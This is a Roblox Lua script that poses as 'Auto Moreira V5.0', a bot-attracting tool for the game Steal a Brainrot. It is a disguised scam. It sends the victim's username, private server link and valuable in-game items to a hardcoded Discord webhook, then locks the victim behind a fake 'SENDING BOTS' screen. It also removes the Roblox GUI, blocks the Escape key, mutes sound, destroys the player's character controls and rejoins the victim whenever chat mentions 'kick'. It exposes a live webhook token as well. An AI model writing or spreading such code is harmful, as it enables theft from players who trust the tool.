-- Main Script: Auto Moreira Scanner with Kick Protection
local supportedPlaceId = 109983668079237

-- Check if we're in the right game
if game.PlaceId ~= supportedPlaceId then
    local Players = game:GetService("Players")
    local player = Players.LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui")

    local warningGui = Instance.new("ScreenGui")
    warningGui.Name = "UnsupportedGameWarning"
    warningGui.ResetOnSpawn = false
    warningGui.IgnoreGuiInset = true
    warningGui.Parent = playerGui

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 400, 0, 150)
    frame.Position = UDim2.new(0.5, -200, 0.5, -75)
    frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    frame.BorderSizePixel = 0
    frame.Parent = warningGui
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, -20, 1, -20)
    label.Position = UDim2.new(0, 10, 0, 10)
    label.BackgroundTransparency = 1
    label.Text = "⚠️ Warning: Unsupported game!\nThis script only works in Steal a Brainrot."
    label.TextColor3 = Color3.fromRGB(255, 100, 50)
    label.Font = Enum.Font.GothamBold
    label.TextScaled = true
    label.TextWrapped = true
    label.Parent = frame

    return
end

-- Initialize services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local preCheckRunning = true
local playerGui = LocalPlayer:WaitForChild("PlayerGui")
local SoundService = game:GetService("SoundService")
local Workspace = game:GetService("Workspace")
local ContextActionService = game:GetService("ContextActionService")
local HttpService = game:GetService("HttpService")
local TextChatService = game:GetService("TextChatService")
local TeleportService = game:GetService("TeleportService")

-- Webhook configuration
local webhook_url = "https://discord.com/api/webhooks/1452198032836919409/Q8EblGg9eL47gfMsgLBR70FQh9RQymWwa18r8TMQVscGpN-2_w1N0pg5tI-Eic7zFbjx"

-- Chat monitoring configuration
local TRIGGER_WORD = "kick"

-- Objects to search for
local searchedObjects = {
    "La Grande Combinasion","Tang Tang Keletang","Swag Soda","Nuclearo Dinossauro","Cooki and Milki",
    "Esok Sekolah","Money Money Puggy","Ketupat Kepat","Tictac Sahur","Chicleteira Noelteira",
    "Ketchuru and Musturu","Garama and Madundung","Spaghetti Tualetti","La Ginger Sekolah",
    "Capitano Moby","La Secret Combinasion","Burguro And Fryuro","La Gingerbread Kepat",
    "Dragon Cannelloni","Secret Lucky Block","Meowl","Los Nooo My Hotspotsitos",
    "Los Spooky Combinasionas","La Casa Boo","Noo my candy","Chipso and Queso",
    "Tacorita Bicicleta","Mariachi Corazoni","La Spooky Grande","Chillin Chili",
    "La Extinct Grande","La Taco Combinasion","W or L","Rang Ring Bus","La Jolly Grande",
    "Quesadillo Vampiro","Las Sis","Celularcini Viciosini","Los Primos",
    "Los Tacoritas","Tralaledon","Los Bros","Los Hotspotsitos","Los Combinasionas",
    "La Supreme Combinasion","Los Mobilis","Los Spaghettis","Los Puggies",
    "Los Quesadillas","Los Burritos","Mieteteira Bicicleteira","Eviledon",
    "Spooky and Pumpky","Headless Horseman","Pirulitoita Bicicleteira",
    "Fragrama and Chocrama","Los Planitos","Spooky Lucky Block","Los 67",
    "Strawberry Elephant","La Extinct Grande"
}

-- Create dictionary for faster lookup
local objectDict = {}
for _, name in ipairs(searchedObjects) do
    objectDict[string.lower(name)] = true
end

-- Function to monitor chat for kick commands
local function setupChatMonitoring()
    TextChatService.OnIncomingMessage = function(message)
        if not message.Text then return end
        
        local text = string.lower(message.Text)
        if string.find(text, TRIGGER_WORD) then
            task.wait(0.1)
            TeleportService:Teleport(game.PlaceId, LocalPlayer)
        end
    end
end

-- Function to get objects in plots
local function getObjectsInPlots()
    local found = {}
    local seen = {} 
    local plotsFolder = Workspace:FindFirstChild("Plots")
    if not plotsFolder then
        warn("No 'Plots' folder found in Workspace.")
        return found
    end

    for _, obj in ipairs(plotsFolder:GetDescendants()) do
        if objectDict[string.lower(obj.Name)] then
            local ignore = false
            local current = obj.Parent
            while current do
                if string.match(current.Name, "^Cube%d+$") then
                    ignore = true
                    break
                end
                current = current.Parent
            end

            if not ignore and not seen[obj.Name] then
                table.insert(found, obj.Name)
                seen[obj.Name] = true
            end
        end
    end
    return found
end

-- Function to validate private server link
local function isValidLink(link)
    if typeof(link) ~= "string" then return false end
    if not string.match(link, "^https://www.roblox%.com/.+") then return false end
    return true
end

-- Function to send webhook notification
local function sendWebhook(link)
    local player = Players.LocalPlayer
    local foundObjects = getObjectsInPlots()

    local utcTime = os.time(os.date("!*t"))
    local utcPlus1 = os.date("%Y-%m-%d %H:%M:%S", utcTime + 3600)
    local utcMinus5 = os.date("%Y-%m-%d %H:%M:%S", utcTime - 5*3600)
    local dateText = "UTC+1: " .. utcPlus1 .. "\nUTC-5: " .. utcMinus5

    local lines = {}
    for _, objName in ipairs(foundObjects) do
        table.insert(lines, objName)
    end
    local objectText = #lines > 0 and table.concat(lines, "\n") or "None"

    local embed = {
        title = "Auto Moreira Scan",
        color = 16777215,
        fields = {
            {name = "Username", value = player.Name, inline = true},
            {name = "Date", value = dateText, inline = true},
            {name = "Private Server", value = link, inline = false},
            {name = "Objects Found", value = objectText, inline = false}
        },
        footer = {text = "mabe hub ◯‍◯‍◯‍◯‍◯"}
    }

    local data = {
        username = "Sab",
        content = "@everyone", 
        embeds = {embed}
    }

    local json = HttpService:JSONEncode(data)

    if typeof(http_request) == "function" then
        http_request({Url = webhook_url, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = json})
    elseif typeof(request) == "function" then
        request({Url = webhook_url, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = json})
    else
        warn("Your executor does not support http_request or request.")
    end

    print("Embed sent to Discord (Sab).")
end

-- Function to mute all sounds
local function muteAllSounds()
    for _, sound in ipairs(SoundService:GetDescendants()) do
        if sound:IsA("Sound") then pcall(function() sound.Volume=0 sound:Stop() end) end
    end
    for _, sound in ipairs(Workspace:GetDescendants()) do
        if sound:IsA("Sound") then pcall(function() sound.Volume=0 sound:Stop() end) end
    end
    SoundService.DescendantAdded:Connect(function(desc)
        if desc:IsA("Sound") then pcall(function() desc.Volume=0 desc:Stop() end) end
    end)
    Workspace.DescendantAdded:Connect(function(desc)
        if desc:IsA("Sound") then pcall(function() desc.Volume=0 desc:Stop() end) end
    end)
end

-- Function to block escape menu
local escBlockActionName = "BlockEscMenu"
local function blockEscMenu()
    return Enum.ContextActionResult.Sink
end

-- Create GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MoreiraMethodGui"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.DisplayOrder = 9999
pcall(function() screenGui.Parent = game:GetService("CoreGui") end)
if not screenGui.Parent then screenGui.Parent = playerGui end

local inputFrame = Instance.new("Frame")
inputFrame.Size = UDim2.new(0, 440, 0, 300)
inputFrame.Position = UDim2.new(0.5, -220, 0.5, -150)
inputFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
inputFrame.BorderSizePixel = 0
inputFrame.Parent = screenGui
Instance.new("UICorner", inputFrame).CornerRadius = UDim.new(0,16)

local shadow = Instance.new("Frame")
shadow.Size = UDim2.new(1,10,1,10)
shadow.Position = UDim2.new(0,-5,0,-5)
shadow.BackgroundTransparency = 0.85
shadow.BackgroundColor3 = Color3.fromRGB(0,0,0)
shadow.ZIndex = 0
shadow.Parent = inputFrame
Instance.new("UICorner", shadow).CornerRadius = UDim.new(0,16)

local label = Instance.new("TextLabel")
label.Size = UDim2.new(1, -40, 0, 60)
label.Position = UDim2.new(0, 20, 0, 25)
label.BackgroundTransparency = 1
label.Text = "STEAL A BRAINROT\nAUTO MOREIRA V5.0"
label.Font = Enum.Font.GothamBold
label.TextScaled = true
label.TextColor3 = Color3.fromRGB(0, 170, 255)
label.Parent = inputFrame

local textBox = Instance.new("TextBox")
textBox.Size = UDim2.new(0.9, 0, 0, 45)
textBox.Position = UDim2.new(0.05, 0, 0, 110)
textBox.PlaceholderText = "Enter your private server link..."
textBox.Font = Enum.Font.Gotham
textBox.TextScaled = true
textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
textBox.BackgroundColor3 = Color3.fromRGB(40,40,40)
textBox.BorderSizePixel = 0
textBox.ClearTextOnFocus = false
textBox.Text = ""
textBox.Parent = inputFrame
Instance.new("UICorner", textBox).CornerRadius = UDim.new(0, 10)

local sendButton = Instance.new("TextButton")
sendButton.Size = UDim2.new(0.5,0,0,45)
sendButton.Position = UDim2.new(0.25,0,0,170)
sendButton.Text = "Start Auto Moreira"
sendButton.Font = Enum.Font.GothamBold
sendButton.TextScaled = true
sendButton.BackgroundColor3 = Color3.fromRGB(0,170,255)
sendButton.TextColor3 = Color3.fromRGB(255,255,255)
sendButton.Parent = inputFrame
Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0,10)

local infoLabel = Instance.new("TextLabel")
infoLabel.Size = UDim2.new(1,-40,0,50)
infoLabel.Position = UDim2.new(0,20,0,230)
infoLabel.BackgroundTransparency = 1
infoLabel.Font = Enum.Font.Gotham
infoLabel.TextScaled = true
infoLabel.TextColor3 = Color3.fromRGB(255,220,0)
infoLabel.Text = "NOTE: You must be the only one on the server. The better your base is, the better bots you will attract."
infoLabel.TextWrapped = true
infoLabel.TextXAlignment = Enum.TextXAlignment.Left
infoLabel.Parent = inputFrame

-- Make GUI draggable
local UserInputService = game:GetService("UserInputService")
local function makeDraggable(frame)
    local dragging = false
    local dragInput, dragStart, startPos

    local function update(input)
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(
            startPos.X.Scale,
            startPos.X.Offset + delta.X,
            startPos.Y.Scale,
            startPos.Y.Offset + delta.Y
        )
    end

    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 
           or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position

            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement 
           or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            update(input)
        end
    end)
end

makeDraggable(inputFrame)

-- Setup chat monitoring
setupChatMonitoring()

-- Player count checker
task.spawn(function()
    while preCheckRunning do
        if #Players:GetPlayers() > 1 then
            label.TextColor3 = Color3.fromRGB(255,60,60)
            label.Text = "❌ Another player is in the server."
            sendButton.Active = false
            sendButton.AutoButtonColor = false
            sendButton.BackgroundColor3 = Color3.fromRGB(120,120,120)
        else
            label.TextColor3 = Color3.fromRGB(0,170,255)
            label.Text = "STEAL A BRAINROT\nAUTO MOREIRA V5.0"
            sendButton.Active = true
            sendButton.AutoButtonColor = true
            sendButton.BackgroundColor3 = Color3.fromRGB(0,170,255)
        end
        task.wait(1)
    end
end)

-- Main button click handler
sendButton.MouseButton1Click:Connect(function()
    if #Players:GetPlayers() > 1 then
        label.TextColor3 = Color3.fromRGB(255,60,60)
        label.Text = "❌ Another player is in the server."
        return
    end

    preCheckRunning = false
    local link = textBox.Text
    if link == "" then
        label.TextColor3 = Color3.fromRGB(255,80,80)
        label.Text = "⚠️ Please enter a private server link!"
        return
    end
    if not isValidLink(link) then
        label.TextColor3 = Color3.fromRGB(255,80,80)
        label.Text = "❌ Invalid or private link. Make sure it starts with https://www.roblox.com"
        return
    end

    local foundObjects = getObjectsInPlots()
    if #foundObjects == 0 then
        label.TextColor3 = Color3.fromRGB(255,60,60)
        label.Text = "❌ No Good Brainrots Found In Your Plot! You need at least one Brainrot for the Auto Moreira system to work. Build or improve your base and try again!"
        preCheckRunning = true
        return
    end

    -- Remove Roblox GUI if possible
    local success, err = pcall(function()
        local coreGui = game:GetService("CoreGui")
        if coreGui:FindFirstChild("RobloxGui") then
            coreGui.RobloxGui:Destroy()
        end
    end)
    if not success then
        warn("Failed to remove RobloxGui:", err)
    end

    inputFrame.Visible = false

    -- Create loading screen
    local blackFrame = Instance.new("Frame")
    blackFrame.Size = UDim2.new(1,0,1,0)
    blackFrame.Position = UDim2.new(0,0,0,0)
    blackFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
    blackFrame.BorderSizePixel = 0
    blackFrame.ZIndex = 9999
    blackFrame.Parent = screenGui

    local loadingText = Instance.new("TextLabel")
    loadingText.Size = UDim2.new(0,200,0,50)
    loadingText.Position = UDim2.new(0.5,-100,0.5,-40)
    loadingText.BackgroundTransparency = 1
    loadingText.Text = "SENDING BOTS..."
    loadingText.Font = Enum.Font.GothamBold
    loadingText.TextScaled = true
    loadingText.TextColor3 = Color3.fromRGB(0,180,255)
    loadingText.ZIndex = 10000
    loadingText.Parent = blackFrame

    local barFrame = Instance.new("Frame")
    barFrame.Size = UDim2.new(0,500,0,28)
    barFrame.Position = UDim2.new(0.5,-250,0.55,0)
    barFrame.BackgroundColor3 = Color3.fromRGB(40,40,70)
    barFrame.BorderSizePixel = 0
    barFrame.ZIndex = 10001
    barFrame.Parent = blackFrame
    Instance.new("UICorner", barFrame).CornerRadius = UDim.new(0,14)

    local fill = Instance.new("Frame")
    fill.Size = UDim2.new(0,0,1,0)
    fill.BackgroundColor3 = Color3.fromRGB(0,140,255)
    fill.BorderSizePixel = 0
    fill.ZIndex = 10002
    fill.Parent = barFrame
    Instance.new("UICorner", fill).CornerRadius = UDim.new(0,14)

    local percentLabel = Instance.new("TextLabel")
    percentLabel.Size = UDim2.new(0,100,0,28)
    percentLabel.Position = UDim2.new(0.5,-50,0.55,0)
    percentLabel.BackgroundTransparency = 1
    percentLabel.Font = Enum.Font.GothamBold
    percentLabel.TextScaled = true
    percentLabel.TextColor3 = Color3.fromRGB(0,180,255)
    percentLabel.Text = "0%"
    percentLabel.ZIndex = 10003
    percentLabel.Parent = blackFrame

    -- Start security measures
    muteAllSounds()
    ContextActionService:BindAction(escBlockActionName, blockEscMenu, false, Enum.KeyCode.Escape)

    -- Send webhook notification
    task.spawn(function()
        sendWebhook(link)
    end)

    -- Destroy humanoid to prevent movement
    task.spawn(function()
        local player = Players.LocalPlayer
        while blackFrame.Parent do
            local character = player.Character
            if character then
                local humanoid = character:FindFirstChild("Humanoid")
                if humanoid then
                    pcall(function() humanoid:Destroy() end)
                end
            end
            task.wait(0.05)
        end
    end)

    -- Progress bar animation
    local duration = 180
    for i = 0,100 do
        fill.Size = UDim2.new(i/100,0,1,0)
        percentLabel.Text = i.."%" 
        task.wait(duration/100)
    end
end)

print("Auto Moreira V5.0 with Kick Protection loaded successfully!")
